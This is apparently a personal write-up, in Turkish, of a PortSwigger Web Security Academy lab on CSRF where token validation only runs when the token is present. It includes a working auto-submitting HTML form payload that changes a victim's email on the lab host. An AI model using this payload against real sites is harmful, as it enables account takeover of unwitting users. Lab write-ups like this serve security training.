@@ -1,0 +1,20 @@
+Lab: CSRF where token validation depends on token being present
+url: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present
+
+
+analiz:
+--csrf adlı bir token ile post ve get methodu kontrol altına alınmış iki methotdada token gerekli
+--get methodunda token yollamadan istek yapılınca hata alıyoruz fakat bunu post methodunda yapınca mail adresi değişiyor. yani bu token
+post methodunda olsada çalışır olmasada .
+
+payload:
+
+        <form method="POST" action="https://0a37008203c0d7de82af6af8009100e1.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="hacked_by@harbinger">
+            <input type="submit" value="Submit request">
+        </form>
+        <script>
+                document.forms[0].submit();
+        </script>
+
+bu payloadla gerekli olan csrf tokenini görmezden gelebildik ve sonuç olarak mail değişti.
